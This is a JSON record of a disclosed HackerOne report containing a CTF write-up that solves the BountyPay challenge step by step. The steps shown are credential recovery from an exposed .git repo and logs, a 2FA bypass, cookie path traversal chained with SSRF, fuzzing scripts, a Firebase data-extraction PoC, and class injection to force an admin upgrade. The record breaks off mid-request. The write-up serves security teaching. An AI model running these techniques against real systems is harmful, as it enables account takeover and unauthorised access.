{
  "id": 888253,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC84ODgyNTM=",
  "url": "https://hackerone.com/reports/888253",
  "title": "[H1-2006 2020] CTF Writeup",
  "state": "Closed",
  "substate": "resolved",
  "readable_substate": "Resolved",
  "created_at": "2020-06-01T10:10:28.353Z",
  "submitted_at": "2020-06-01T10:10:28.353Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "yashrs",
    "url": "/yashrs",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/S9WnJuUrpWvxZ6iM38qL2HE4/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98"
    },
    "is_me?": false,
    "cleared": true,
    "verified": true,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 46757,
    "url": "https://hackerone.com/h1-ctf",
    "handle": "h1-ctf",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/1hYGHKjWZv64FAEYq32nP1EU/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/1hYGHKjWZv64FAEYq32nP1EU/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [],
    "submission_state": "paused",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": false,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "h1-ctf",
      "twitter_handle": "Hacker0x01",
      "website": "",
      "about": "Let's save the holidays together! #TogetherWeHitHarder"
    }
  },
  "has_bounty?": false,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2020-07-06T16:02:37.272Z",
  "bug_reporter_agreed_on_going_public_at": "2020-06-23T07:36:54.183Z",
  "team_member_agreed_on_going_public_at": "2020-07-06T16:02:37.167Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "Hi,\n\nThe  flag is :`^FLAG^736c635d8842751b8aafa556154eb9f3$FLAG$`\n\n{F850811}\n\nI will do the writeup in the report summary. \n\nRegards,\nYash\n\n## Impact\n\nNone as the money paid was not real",
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [
    {
      "id": 850811,
      "file_name": "Screen_Shot_2020-06-01_at_3.36.55_PM.png",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/qNnQPvUUuDuYtYkWVtcVrQtc?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2020-06-01_at_3.36.55_PM.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2020-06-01_at_3.36.55_PM.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ3I276FVZ%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T134553Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIBR%2Fcj4He1YNoxuqlCR8y8rqIukyINMyDPuGH4bBYx6SAiEA9rxAEFgc%2FY9ADMxq89WI%2F4YUHMXyjEPxPzJLolchOMcqsgUIdhADGgwwMTM2MTkyNzQ4NDkiDFBjNDAnQ2OT9fFEUCqPBdD%2BXXWBgaRxNEUUo6cEeoytD1eXvhIsF8BkIAolofhhkKHa%2FJ9rh00ejh6T8IepmFmzqyDA1to2vDIum2KthQ0U6K%2Fq21GMCUMZo7xXkyphPeZxTlJE8cbrBa9V7531H4caFbz7tu71hUjruj7poNeDwa5J2XkqEShNg6VTkYFYqW2p508BdQAm0fm%2BJSHq3faBYzcdc%2BIdgG0f6PUjEYh8ysP11Ro09SiXv3N3T6DptjJHKSv7KUv%2FZb54m8zxj0ho7JBJGg0PnntZNlzuUrPyB5o8m6NghY%2FGYTA8AM56YwOqBpjHb6CnraAhdaDe1bVoMVPvNpaoYIcwcd4aA5uVq%2F%2BMEFbgRAsaOaZwmVbJkgiy2He0wZ1y%2Bi038Z1fvfDUbGHaWHIvakM7EmAYLWhUjnVli%2B3NqZponfkOVtoUKkcIkHv%2FMcMGpAcK0LuL5c2PBD0kic3yPmgcNitophPyXa55qvUBwb0m1aYQTwhCX70%2B1MuBBNqQvAsVUygdhbSZflPVFLVYXYCw10pZBosqrbt33MeOhLAD8A8FNaf8XnRxoIDh3nC1b6UKs2zWAsQPsE7gNEmhUsXIocoqXYlZh%2FQZSSdnGUabitNEws3%2FzTErmpCZuC2pr4nC5OCy4AoCpAKYzhiaBnVjXyi1NhUFfB7kXutS3csu0Lk3ScNHi9nlMRK%2FSHZ%2BmmfQUxKvkUG6N76Rrx09p1D%2Brasm6BwCfo%2FSw7hRWxvXSZbCwxc3do9Mpm9IRFA7fgftyitVAMxs%2B8%2FYuoPx7yvUxg0bClyQ192xRI2lA%2B2Re%2FTICR8V2PH0zUKh00J8XQvEL4nx0dQPY1eX5ebqa0OrnmqUj5MM0BpBxhDPhte4fVZA92wwkMCtrgY6sQESsP34nDSGQ6%2FMJpkkUSZiwSB%2F4jJvcrOQGDnz8fYink0yrV9jUVthg%2F0T80d3eDYEK8OVRR2nDjVCUQg3IxtCiugMaPpFUdgVHqXf%2FGpaDapO5M8KW58NB4nk4LoOYgrk9ZTwWMl3jVREWlQWgRKb1D2x8jgp12%2B72xMOnvcfsjT5bTR2OBDEBsh2BamCCdP1z2L0lwJwCGwomgMutcDqcL1aIj%2F%2Fac5TUFnKnI3315E%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=fcc8535e044faeb7e4c46f879f3b5f1912602f78d3f7557bc933e3532bfb97d6",
      "file_size": 142300,
      "type": "image/png",
      "moderated": null
    }
  ],
  "allow_singular_disclosure_at": "2020-07-23T07:36:54.235Z",
  "allow_singular_disclosure_after": -112342138.9977746,
  "singular_disclosure_allowed": true,
  "vote_count": 10,
  "voters": [
    "rook1337",
    "ninetynine",
    "s1r1u5",
    "romesful",
    "idiablos",
    "absshax",
    "tbehroz",
    "pandaaaa",
    "meraxes",
    "solosubtle"
  ],
  "structured_scope": {
    "databaseId": 48138,
    "asset_type": "WILDCARD",
    "asset_identifier": "*.bountypay.h1ctf.com",
    "max_severity": "none"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "id": 22776,
      "category": "researcher",
      "content": "So there are a lot of writeups for H1-CTF disclosed, here are two things unique in this report which a reader might be interested in:\n\n- Solving the Android part without even opening the application\n- Full automation for last stage - CSS Exfiltration along with the script used\n\nHappy Reading!\n\n---\n\n# Summary\n{F860074}\n{F860071}\n\n# Detailed Writeup:\nAs always, it all started with a tweet:\n\n{F850819}\n\nDoing basic subdomain enumeration using amass: `amass enum -d \"bountypay.h1ctf.com\"`, we find the following subdomains\n- https://bountypay.h1ctf.com/\n{F861197}\n- https://app.bountypay.h1ctf.com/\n{F861198}\n- https://staff.bountypay.h1ctf.com/\n{F861199}\n- https://software.bountypay.h1ctf.com/\n{F861201}\n- https://api.bountypay.h1ctf.com/\n{F861202}\n\nAfter gathering the subdomains, I tried to manually open all of them and make some notes and observations\n\n## Quick Observations made:\n- https://app.bountypay.h1ctf.com is accessible but requires some kind of login.\n- https://staff.bountypay.h1ctf.com redirects us to https://staff.bountypay.h1ctf.com/?template=login so it uses some dynamic page generation in the backend using templates\n- https://api.bountypay.h1ctf.com/ contains the API which might be called from the browser or the backend. It responds with `[\"Endpoint Not Found\"]` if the API endpoint is not found. Also it contains an open redirect which is visible at `https://api.bountypay.h1ctf.com/redirect?url=https://www.google.com/search?q=REST+API` \n- https://software.bountypay.h1ctf.com is not directly accessible from the browser. It is blocking requests which comes from outside world directly. This hints at SSRF very strongly at some point of the challenge\n\nAt this point, I tried SQL Injection in the both the login endpoints: https://app.bountypay.h1ctf.com and https://staff.bountypay.h1ctf.com/?template=login without any success.\n\n## Going a bit further in all subdomains:\nIt was necessary now to find more attack surface so I tried running dirsearch on all the subdomains with the default wordlist: `cat domains.txt | xargs -I {} python3 dirsearch.py -u {} -E`\n\nAfter running dirsearch we discover a `.git` folder in the app.bountypay.h1ctf.com subdomain\n{F850899}\n\nI got really excited that we have source code analysis now. Downloaded Git Dumper(https://github.com/internetwache/GitTools) and ran it:\n\n```bash\ngit clone https://github.com/internetwache/GitTools.git && cd GitTools\n./Dumper/gitdumper.sh https://app.bountypay.h1ctf.com/.git/ repo\n```\n\n{F850908}\n\nAll hopes in vain as no objects were downloaded. I thought it was a rabbit hole and started looking for other things.\n\nAfter hours of looking for something, I came back to the folder and issued a `cat .git/*` command and got the repo:\n\n```bash\n[remote \"origin\"]\n\turl = https://github.com/bounty-pay-code/request-logger.git\n\tfetch = +refs/heads/*:refs/remotes/origin/*\n```\n\n```bash\ngit clone https://github.com/bounty-pay-code/request-logger.git\ncd request-logger && ls\n```\n\nWe find a file named `logger.php` which contained the following:\n\n```php\n<?php\n\n$data = array(\n  'IP'        =>  $_SERVER[\"REMOTE_ADDR\"],\n  'URI'       =>  $_SERVER[\"REQUEST_URI\"],\n  'METHOD'    =>  $_SERVER[\"REQUEST_METHOD\"],\n  'PARAMS'    =>  array(\n      'GET'   =>  $_GET,\n      'POST'  =>  $_POST\n  )\n);\nfile_put_contents('bp_web_trace.log', date(\"U\").':'.base64_encode(json_encode($data)).\"\\n\",FILE_APPEND   );\n```\n\nWe get a filename `bp_web_trace.log`. We go to https://app.bountypay.h1ctf.com/bp_web_trace.log and download the log file. We decode the contents of the file by reversing the log function. We split it by \":\" take the second part and base64 decode all the lines one by one.\n\n```bash\ncat bp_web_trace.log | \\\nawk -F ':' '{print $2}' | \\\nwhile IFS= read -r line; do echo \"$line\" | \\\nbase64 -d | \\\ncat; echo ''; done | \\\ntee decoded.txt\n```\n\nIn decoded.txt we find the creds:\n - Username: `brian.oliver`\n - Password: `V7h0inzX`\n\nWe use it to log into https://app.bountypay.h1ctf.com and we get this 2FA page:\n\n{F851459}\n\nThere was a `challenge` param which was given to us and `challenge_answer` which was the 2FA code to be submitted by us. The challenge param looked like a md5 hash of some random value. So I tried generating MD5 value of my own. I used `a` as the `challenge_answer` and `md5('a') = 0cc175b9c0f1b6a831c399e269772661` as `challenge` param and the 2FA was bypassed. We get a nice interface after bypassing the two factor authentication:\n\n{F850956}\n\nWe also get an interesting cookie: `eyJhY2NvdW50X2lkIjoiRjhnSGlxU2RwSyIsImhhc2giOiJkZTIzNWJmZmQyM2RmNjk5NWFkNGUwOTMwYmFhYzFhMiJ9` which when base64-decoded gives us \n\n```json\n{\n  \"account_id\": \"F8gHiqSdpK\",\n  \"hash\": \"de235bffd23df6995ad4e0930baac1a2\"\n}\n```\n\nWe just have the functionality to retrieve Transactions. This makes a call to https://app.bountypay.h1ctf.com/statements?month=04&year=2020 from the browser.\n\nWe can determine that the backend server is interacting with the api subdomain by the following response:\n\n```http\nHTTP/1.1 200 OK\nServer: nginx/1.14.0 (Ubuntu)\nContent-Type: application/json\nConnection: close\nContent-Length: 177\n\n{\"url\":\"https:\\/\\/api.bountypay.h1ctf.com\\/api\\/accounts\\/F8gHiqSdpK\\/statements?month=04&year=2020\",\"data\":\"{\\\"description\\\":\\\"Transactions for 2020-04\\\",\\\"transactions\\\":[]}\"}\n```\n\nBy basic observation, we can see that it is of the form `https://api.bountypay.h1ctf.com/api/accounts/account_id/statements?month=04&year=2020`(We will take a note of this in our observations as this shows us the structure of the API). This account ID is from the cookie. So it seems like we have to tamper with the cookie somehow to change the account_id in the URL to achieve path traversal. We can refer our previous observations/notes that we have an open redirect at `https://app.bountypay.h1ctf.com/redirect?url` endpoint.\n\nFirst thought in mind was that this also might be MD5 hash and it turns out that the length matches but it's not directly the hash of the account_id. With this MD5 length extension attacks come in mind. It turns out we can directly change `account_id` without changing hash and it would work*.\n\nSo we can now traverse the path and chain it with the open redirect. We can use `account_id` in the cookie as `../../../../../redirect?url=https://REDIRECT_URL/#` (hash is required so that it ignored any text after that as it is considered fragment). After playing around with it a bit, we get to know that it uses a whitelist for URLs so we don't have a full SSRF but enough to go ahead in the challenge. Whitelisted URLs are `https://google.com/search?q=query` and the subdomains of `bountypay.h1ctf.com`. The server happily fetched the software subdomain for us :)\n\nWe have `{\"account_id\":\"../../../../../redirect?url=https://software.bountypay.h1ctf.com/#\",\"hash\":\"de235bffd23df6995ad4e0930baac1a2\"}` -> base64 -> Use this as token cookie and fire a request to `/statements` endpoint. After performing the SSRF+Open Redirect chain, all we could get was a login page:\n\n{F851099}\n\nThere is no way we can send a POST request using the SSRF so we can't even reuse the credentials we got earlier on this subdomain. I was stuck on what to do with this endpoint. I took a break and came back with a fresh mind. Why not bruteforce path using the SSRF and see if we can find anything? So I wrote a custom Turbo Intruder python script:\n\n```python\nimport base64\nimport json\n\ndef gencookie(message):\n    message = json.dumps({\"account_id\":\"../../../../redirect?url=https://software.bountypay.h1ctf.com/\"+message+\"#\",\"hash\":\"de235bffd23df6995ad4e0930baac1a2\"})\n    message_bytes = message.encode('ascii')\n    base64_bytes = base64.b64encode(message_bytes)\n    base64_message = base64_bytes.decode('ascii')\n    return(base64_message)\n\n# Find more example scripts at https://github.com/PortSwigger/turbo-intruder/tree/master/examples\ndef queueRequests(target, wordlists):\n    engine = RequestEngine(endpoint=target.endpoint,\n                           concurrentConnections=30,\n                           requestsPerConnection=3,\n                           pipeline=False\n                           )\n    engine.start()\n    for word in open('/Users/yashsodha/Downloads/dirsearch-master/db/dicc.txt'):\n        engine.queue(target.req, gencookie(word.rstrip()))\n\ndef handleResponse(req, interesting):\n    if \"404 Not Found\" not in req.response and \"400 Bad Request\" not in req.response:\n        table.add(req)\n```\n\nThis can also be achieved with Intruder with the following configuration:\n{F851175}\n\nAfter fuzzing:\n\n{F851533}\n\nWe get a directory listing at `https://software.bountypay.h1ctf.com/uploads/` path with an APK: https://software.bountypay.h1ctf.com/uploads/BountyPay.apk. First thing I do when I get an APK is install the APK and decompile it with Jadx (https://github.com/skylot/jadx).\n\nI found a few references to Firebase and some paths to Firebase Realtime Database. This can be identified by searching for `addListenerForSingleValueEvent` or `.child` in the application and another reference was to Anonymous login(`this.mAuth.signInAnonymously().addOnCompleteListener`). \n\nSome paths were base64 encoded some were not:\n\n```java\nfinal String directory = \"aG9zdA==\";\nfinal String directoryTwo = \"WC1Ub2tlbg==\";\nfinal String headerDirectory = \"header\";\n```\n\nThis gives us `host`, `X-Token`, `header` respectively.\n\nAfter going through the docs(https://firebase.google.com/docs/auth/web/anonymous-auth and https://firebase.google.com/docs/database/web/read-and-write), I realized that this is possible without the mobile application as well. We need to extract the apiKey, authDomain, databaseURL from strings.xml in the application and follow the docs. HTML Proof of Concept:\n\n```html\n<body>\n  <script src=\"https://www.gstatic.com/firebasejs/7.14.6/firebase.js\"></script>\n  <script>\n    function add(message)\n    {\n    \tvar message = message\n    \tvar pre = document.createElement(\"pre\");\n    \tpre.style.wordWrap = \"break-word\";\n    \tpre.innerText = message;\n    \toutput.appendChild(pre);\n    \tvar hr = document.createElement(\"hr\");\n    \toutput.appendChild(hr);\n    }\n\tvar firebaseConfig = {\n\t  apiKey: \"AIzaSyAyr601_-ElsasDnhGORBykg0ZTDaOxFeo\",\n\t  authDomain: \"bountypay-90f64.firebaseapp.com\",\n\t  databaseURL: \"https://bountypay-90f64.firebaseio.com\",\n\t  projectId: \"bountypay-90f64\",\n\t  storageBucket: \"bountypay-90f64.appspot.com\",\n\t  appId: \"bountypay-90f64\"\n\t};\n    firebase.initializeApp(firebaseConfig);  // Initialize Firebase\n    var auth = firebase.auth();\n    auth.onAuthStateChanged(function(user) {\n\t  if (user) {    // User is signed in\n\t    var uid = user.uid;\n\t    console.log(\"Signed in\");\n\t    console.log(user);\n\t    firebase.database().ref(\"X-Token\").once('value').then(function(snap){\n\t    \tvar v = snap.val();\n\t    \tadd(\"X-Token: \" + v);\n\t    });\n\t    firebase.database().ref(\"host\").once('value').then(function(snap){\n\t    \tvar v = snap.val();\n\t    \tadd(\"Host:  \" + v);\n\t    });\n\t    firebase.database().ref(\"header\").once('value').then(function(snap){\n\t    \tvar v = snap.val();\n\t    \tadd(\"Header: \" + v);\n\t    });\n\t  } \n      });\n\tauth.signInAnonymously().catch(function(error) {console.log(error);});\n  </script>\n  <div id=\"output\">\n Output:\n  </div>\n</body>\n```\n\nOutput:\n{F851224}\n\nSo static analysis of the app did most of the part for me and at this point I didn't even have to open the app. But as this CTF was also designed by @B3nac I thought about exploring the app dynamically as well as there might be some other aspect to it. \n\nSo, installing the APK and opening it gives us:\n\n{F851263}\n\nAfter filling up details and submitting it gives us:\n\n{F851264}\n\nGoing through the app, we find this which means we have to invoke the intent specifically. We can do it in multiple ways, here I will use `adb` to invoke the intents. We can use https://play.google.com/store/apps/details?id=com.manoj.dlt&hl=en_IN or create our own android app which does it as well.\n\n```java\n        if (getIntent() != null && getIntent().getData() != null && (firstParam = getIntent().getData().getQueryParameter(\"start\")) != null && firstParam.equals(\"PartTwoActivity\") && settings.contains(\"USERNAME\")) {\n```\n\nWe use the following command to open the activity with the params required.\n\n```bash\nadb shell am start -d \"one://part?start=PartTwoActivity\" \n```\n\nWe get invisible PartTwo, but again we go through the APK to find this:\n\n```java\nUri data = getIntent().getData();\nString firstParam = data.getQueryParameter(\"two\");\nString secondParam = data.getQueryParameter(\"switch\");\nif (firstParam != null && firstParam.equals(\"light\") && secondParam != null && secondParam.equals(\"on\")) {\n```\n\nwhich leads us to:\n\n```bash\nadb shell am start -d \"two://part/?switch=on\\&two=light\"\n```\n\n{F851277}\n\n```java\nDatabaseReference childRef = this.database.child(\"header\");\n...\nthis.childRef.addListenerForSingleValueEvent(new ValueEventListener() {\n    public void onDataChange(DataSnapshot dataSnapshot) {\n        SharedPreferences settings = PartTwoActivity.this.getSharedPreferences(PartTwoActivity.KEY_USERNAME, 0);\n        SharedPreferences.Editor editor = settings.edit();\n        String str = post;\n        if (str.equals(\"X-\" + ((String) dataSnapshot.getValue()))) {\n            PartTwoActivity.this.logFlagFound(settings.getString(\"USERNAME\", \"\"), settings.getString(\"TWITTERHANDLE\", \"\"));\n            editor.putString(\"PARTTWO\", \"COMPLETE\").apply();\n            PartTwoActivity.this.correctHeader();\n            return;\n        }\n```\n\nUpon seeing `459a6f79ad9b13cbcb5f692d2cc7a94d` in the activity, it again looked like MD5 hash, we go to https://md5.gromweb.com/?md5=459a6f79ad9b13cbcb5f692d2cc7a94d to decrypt it and voila:\n\n{F861185}\n\nWe enter `X-Token` and go ahead to the third part\n\n```bash\nadb shell am start -d \"three://part/?three=UGFydFRocmVlQWN0aXZpdHk=\\&switch=b24=\\&header=X-Token\"\n```\n\nIn PartThreeActivity.java we see this:\n\n```java\nhandler.postDelayed(new Runnable() {\n    public void run() {\n        PartThreeActivity.this.signIn();\n    }\n}, 10000);\nhandler.postDelayed(new Runnable() {\n    public void run() {\n        PartThreeActivity.this.getHost();\n    }\n}, 20000);\nhandler.postDelayed(new Runnable() {\n    public void run() {\n        PartThreeActivity.this.getToken();\n    }\n}, 20000);\n...\npublic void getHost() {\n    final SharedPreferences.Editor editor = getSharedPreferences(KEY_USERNAME, 0).edit();\n    this.childRef.addListenerForSingleValueEvent(new ValueEventListener() {\n        public void onDataChange(DataSnapshot dataSnapshot) {\n            editor.putString(\"HOST\", (String) dataSnapshot.getValue()).apply();\n        }\n        public void onCancelled(DatabaseError databaseError) { ... }\n    });\n}\n\npublic void getToken() {\n    final SharedPreferences.Editor editor = getSharedPreferences(KEY_USERNAME, 0).edit();\n    this.childRefTwo.addListenerForSingleValueEvent(new ValueEventListener() {\n        public void onDataChange(DataSnapshot dataSnapshot) {\n            editor.putString(\"TOKEN\", (String) dataSnapshot.getValue()).apply();\n        }\n        public void onCancelled(DatabaseError databaseError) { ... }\n    });\n}\n```\n\nWe see that it gets the Token and the host automatically and stores it in the shared_preferences after 20 seconds.\n\nSo, we can simply go to the shared_preferences directory and inside the \n\n```bash\nOnePlus5:/data/data/bounty.pay/shared_prefs # cat user_created.xml                                                                                                             \n```\n\nOutput:\n\n```xml\n<?xml version='1.0' encoding='utf-8' standalone='yes' ?>\n<map>\n    <string name=\"USERNAME\">yashrs</string>\n    <string name=\"PARTTWO\">COMPLETE</string>\n    <string name=\"HOST\">http://api.bountypay.h1ctf.com</string>\n    <string name=\"PARTONE\">COMPLETE</string>\n    <string name=\"TWITTERHANDLE\">y_sodha</string>\n    <string name=\"TOKEN\">8e9998ee3137ca9ade8f372739f062c1</string>\n</map>\n```\n\nWe enter this token from the Shared Preferences in the application and we get this. We are done with the Android part! :D\n\n{F851344}\n\nSo these were the same things we got from firebase database directly by using their JS SDK, well except the wonderful page which said `Congrats! You completed all the Android challenges`. The Android app didn't give us anything else other than this.\n\nSo, the additional information we have from this Android side mission:\n\n- `X-Token` is header and it's value is: `8e9998ee3137ca9ade8f372739f062c1`\n- Host is: `http://api.bountypay.h1ctf.com`\n\n## Revisiting BountyPay API:\n- When we exploited the SSRF in the statements endpoint `https://app.bountypay.h1ctf.com/statements?month=04&year=2020`, the backend made a request to `https://api.bountypay.h1ctf.com/api/accounts/F8gHiqSdpK/statements?month=04&year=2020` which if we accessed directly gave us the following error:\n\n{F851339}\n\nSo now we try with the `X-Token` header as indicated in the application by making a HTTP Request:\n\n{F851354}\n \nIt works!\n\n## Sandra - Twitter Hint\nMeanwhile a hint was dropped on HackerOne's twitter account:\n{F851361}\n\nThis leads us to\n{F851362}\n\nGoing into the accounts followed by their Twitter account we find Sandra's twitter account and her Staff ID(STF:8FJ3KFISL3) as well:\n{F851363}\n\nThis gave a big clue that somewhere in the Application or API we have to use the Staff ID. First guess was SQL Injection due to this:\n \n{F851370}\n\nI tried SQL Injection in the staff login at https://staff.bountypay.h1ctf.com/ to no avail. Even tried SQL injection in template parameter and username parameter. These were the only possible inputs for us at this stage. \n\n## Fuzzing and more fuzzing - Getting Sandra's Credentials\nAfter the SQLi rabbit hole, we are left with no other option except to find other API endpoints now that we have the token.\n\nWe have the format of the statement API as `https://api.bountypay.h1ctf.com/api/accounts/F8gHiqSdpK/statements?month=04&year=2020`. As this seems like a REST api, we can try going back directories and finding stuff. For example, if we go back on path, we get to  https://api.bountypay.h1ctf.com/api/accounts/F8gHiqSdpK which shows us the basic information of Brian's account which doesn't actually have any useful information:\n\n{F851375}\n\nSo for fuzzing, I used Intruder and I found this nice repo https://github.com/chrislockard/api_wordlist with a good wordlist.\n\nIntruder Positions:\n{F851382}\n\nUsed HTTP methods known for the first injection position and second was the wordlist:\n{F851387}\n\n{F851400}\n\nSorting by length gets us:\n\n{F851392}\n\nWe find the following endpoints: `GET /api/staff` and `POST /api/staff`. Damn this was a simple one, could have been guessed as well, but fuzzing FTW!\n\n`GET /api/staff` endpoint gave us details of the existing staff members whose accounts were already created.\n\n```json\n[\n  {\n    \"name\": \"Sam Jenkins\",\n    \"staff_id\": \"STF:84DJKEIP38\"\n  },\n  {\n    \"name\": \"Brian Oliver\",\n    \"staff_id\": \"STF:KE624RQ2T9\"\n  }\n]\n```\n\n`POST /api/staff` is more interesting one as it says:\n\n```json\n[\n  \"Missing Parameter\"\n]\n```\n\nSo we make a request to `POST /api/staff` using Sandra's staff_id that we got from twitter:\n\n```http\nPOST /api/staff HTTP/1.1\nHost: api.bountypay.h1ctf.com\nConnection: close\nDNT: 1\nX-Token: 8e9998ee3137ca9ade8f372739f062c1\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4156.0 Safari/537.36\n\nstaff_id=STF:8FJ3KFISL3\n```\n\nI was greeted with `Missing Parameter` again. Now at this time, I was really tired and my brain wasn't working properly. I knew something is there here but I am missing something. After some time, after introspecting the request again, I realized I had not included `Content-Type: application/x-www-form-urlencoded` 🤦‍♂️🤦‍♂️\n\nAdding that header gave us Sandra's credentials:\n\n```json\n{\n  \"description\": \"Staff Member Account Created\",\n  \"username\": \"sandra.allison\",\n  \"password\": \"s%3D8qB8zEpMnc*xsz7Yp5\"\n}\n```\n\n## Staff Subdomain:\n- We login to https://staff.bountypay.h1ctf.com/ using the credentials:\n{F851411}\n- Again back to basics and observing things and noting them down. Things seem to get interesting from here:\n - There are 3 Tabs: Home, Support Tickets, Profile. 4th option is Logout\n - There is only one support ticket https://staff.bountypay.h1ctf.com/?template=ticket&ticket_id=3582 which cannot be replied to.\n - In the profile section, we have option to change Profile name and Avatar.\n \nI like to get a feel of how the application is behaving when doing CTFs and/or Bug Bounty. Using the app for some more time, I observed something more:\n- The avatar is displayed using CSS(https://staff.bountypay.h1ctf.com/css/style.css) by using static class entries:\n\n```css\n.avatar {\n    width:64px;\n    height:64px;\n}\n.avatar1 {\n       background-image:url(\"data:image/png;base64,asd\");\n}\n.avatar2 {\n      background-image:url(\"data:image/png;base64,asd\");\n}\n.avatar3 {\n    background-image:url(\"data:image/png;base64,asd\");\n}\n```\n\n- There are only three default avatars but we can change our avatar to anything arbitrary and that gets reflected inside the class where our avatar is displayed. \n{F851418}\n\nI also tried XSS and HTML injection, but the webserver strips all other characters out except space\n\n- There is a javascript file at https://staff.bountypay.h1ctf.com/js/website.js which seems to be having some logic for the WebApp. We will analyze this file. I found two interesting functions:\n\nThere is a function to upgrade an user to admin:\n\n```javascript\n$(\".upgradeToAdmin\").click(function() {\n    let t = $('input[name=\"username\"]').val();\n    $.get(\"/admin/upgrade?username=\" + t, function() {\n        alert(\"User Upgraded to Admin\")\n    })\n})\n```\n\nThere is a function to report any URL (this can also be revoked by clicking on Report This Page at the bottom of the page:\n\n```javascript\n$(\".sendReport\").click(function() \n{\n    $.get(\"/admin/report?url=\" + url, function() \n    {\n        alert(\"Report sent to admin team\")\n    }), \n    $(\"#myModal\").modal(\"hide\")\n})\n```\n\n- I took a wild shot and visited https://staff.bountypay.h1ctf.com/admin/upgrade?username=sandra.allison but was obviously greeted with `Only admins can perform this`. Not that simple, huh!\n\nNext thing intuitively was to try for reporting `/admin/upgrade?username=sandra.allison` URL via the `/admin/report?url=` functionality. When opening the `Report This Page` functionality, it explicitly says that `Pages in the /admin directory will be ignored for security` so that shouldn't work. I still tried for the sake of it and it didn't :P\n\n{F851422}\n\nSo now again I was left with a dead-end and this was the most hard step to overcome for me. I took a lot of time and honestly even thought about giving up on this because I didn't seem to find anything.\n\n## Exploiting Report to Admin functionality\n- Again going through the WebApp, I found out it is using older version of jQuery which has some public XSS CVEs. After trying for some time, I couldn't find anything related to this and decided to move on.\n\n- I revisited the javascript and found this code at the bottom:\n\n```javascript\ndocument.location.hash.length > 0 && \n(\"#tab1\" === document.location.hash && $(\".tab1\").trigger(\"click\"),\n \"#tab2\" === document.location.hash && $(\".tab2\").trigger(\"click\"), \n \"#tab3\" === document.location.hash && $(\".tab3\").trigger(\"click\"),\n  \"#tab4\" === document.location.hash && $(\".tab4\").trigger(\"click\"));\n```\n\nSo as there were tabs in the application, this looks like something a developer might have written so that a particular tab can be opened when the page loads. For example, in the HTML we have:\n\n```html\n<li role=\"presentation\" class=\"tab tab1 active\" data-target=\"home\"><a href=\"#\">Home</a></li>\n<li role=\"presentation\" class=\"tab tab2\" data-target=\"tickets\"><a href=\"#\">Support Tickets</a></li>\n<li role=\"presentation\" class=\"tab tab3\" data-target=\"profile\"><a href=\"#\">Profile</a></li>\n```\n\nSo opening https://staff.bountypay.h1ctf.com/?template=home#tab1 will open up Home, opening https://staff.bountypay.h1ctf.com/?template=home#tab2 will open up Support Tickets and so on. One might ask, how? \n\nSo, let's take an example of `#tab1` being at the end of the URL. In JS this is populated in the `document.location.hash` variable. So, in this case `\"#tab1\" === document.location.hash` condition will be true which will execute `$(\".tab1\").trigger(\"click\")`. This click triggers `$(\".tab\").click` function which shows the corresponding `content-id` div(In this case `home`)\n\n```html\n<div class=\"content content-home\">\n        <div class=\"alert alert-success text-center\">\n              <p>Our easy to use staff portal allows you to receive messages from our friendly admin team</p>\n        </div>\n</div>\n```\n\nAlso, one trait of jQuery is that if $(\"selector\") matches multiple elements and if we call $(\"selector\").click() it will call click for all those elements and not just one element. This can be verified by the following HTML:\n\n```html\n<html>\n<script src=\"https://code.jquery.com/jquery-3.5.1.min.js\"></script>\n<button class=\"abc xyz\" onclick=\"console.log('xyz')\">xyz</button>\n<button class=\"abc def\" onclick=\"console.log('def')\">def</button>\n<br><br><br>\nExecute <code>$(\".abc\").click()</code> in the console\n</html>\n```\n\n{F851432}\n\nSo now combining this fact with the fact that we are able to inject any class in our avatar, I came up with a solution that our avatar should have two classes: `tab1` and `upgradeToAdmin` with the hash #tab1 in the URL. This will work wherever our avatar is displayed. The `#tab1` hash will invoke the click method on all `tab1` class elements. All the elements with `upgradeToAdmin` have a onclick method which calls the `/admin/upgrade` endpoint. Our avatar would have both those classes making this attack work.\n\nTo change this, we can go to https://staff.bountypay.h1ctf.com/?template=home. Click on Profile, select any Avatar and then the Update button and intercept the request. We can change `avatar2` to `tab1 upgradeToAdmin` on the fly making the request\n\n```http\nPOST /?template=home HTTP/1.1\nHost: staff.bountypay.h1ctf.com\nConnection: close\nContent-Length: 42\nOrigin: https://staff.bountypay.h1ctf.com\nUpgrade-Insecure-Requests: 1\nDNT: 